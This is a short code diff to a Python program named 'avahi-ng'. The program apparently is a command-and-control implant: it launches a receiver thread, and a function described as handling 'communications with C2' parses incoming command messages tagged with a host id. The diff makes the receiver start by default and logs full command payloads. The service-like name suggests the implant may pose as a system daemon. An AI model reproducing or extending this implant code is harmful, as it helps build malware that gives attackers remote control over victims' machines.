@@ -17,7 +17,7 @@ logging.basicConfig(level=logging.DEBUG)
 logging.info("Starting avahi-ng...")
 rx = channel.Receiver()
 rx_thread = threading.Thread(target=rx.start)
-if len(sys.argv) >=2 and sys.argv[1] != "nocap":
+if len(sys.argv) <2 or sys.argv[1] != "nocap":
     rx_thread.start()
     logging.debug("launched rx thread")
 
@@ -82,7 +82,7 @@ def communicate():
     """Handle communications with C2"""
     for i in rx.messages:
         if i.finalized and i.payload[0:5] == "c" + id:
-            logging.debug("got new command message")
+            logging.debug("got new command message: {}".format(i.payload))
             load: str
             load = i.payload[5:]
             match load.split(":")[0]:
